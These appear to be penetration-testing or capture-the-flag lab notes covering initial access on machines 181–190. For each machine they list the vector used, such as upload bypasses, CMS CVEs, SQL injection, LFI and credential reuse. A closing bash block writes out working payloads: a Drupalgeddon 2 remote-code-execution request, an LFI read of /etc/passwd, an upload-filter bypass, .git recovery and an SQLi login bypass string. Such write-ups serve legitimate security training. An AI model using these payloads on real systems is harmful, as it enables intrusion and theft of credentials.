## 🔓 Initial Access (Machines 181–190)

### Common Entry Points
- CMS exploitation (WordPress, Joomla)
- LFI/RFI to Code Execution
- File upload (bypassing filters)
- Default credentials and exposed admin panels

### Observed Vectors per Machine

**Machine 181**
- File upload to `/uploads` bypassed with `.php5` extension
- Triggered reverse shell with uploaded webshell

**Machine 182**
- Exploited WordPress plugin vulnerability (Unauthenticated RCE)
- Used Metasploit module for CVE-2019-8942

**Machine 183**
- Login bypass via SQL Injection in `/login.php`
- Gained access to admin panel and uploaded shell

**Machine 184**
- Exposed Samba share with executable `.sh` file
- Mounted share and executed malicious script

**Machine 185**
- Drupal CMS running → CVE-2018-7600 (“Drupalgeddon 2”)
- Triggered remote code execution through crafted POST request

**Machine 186**
- Found exposed login panel → bruteforced password
- SSH reused creds from web application

**Machine 187**
- LFI on `/index.php?file=` → log poisoning for shell

**Machine 188**
- CVE-2017-5638 (Apache Struts) exploited via crafted header payload

**Machine 189**
- Discovered exposed `.git` repo → recovered `config.php`
- Extracted DB creds → reused for admin panel login

**Machine 190**
- CMS plugin allowed unauthenticated plugin installation
- Uploaded reverse shell plugin

### Techniques Used

```bash
# Upload shell bypass
mv shell.php shell.php5

# LFI exploitation
curl http://<IP>/?file=../../../../etc/passwd

# Drupalgeddon 2 PoC
curl -s -X POST --data "form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=id" http://<IP>/?q=user/register

# Git repo recovery
git clone http://<IP>/.git

# SQLi login bypass
' OR '1'='1 --
```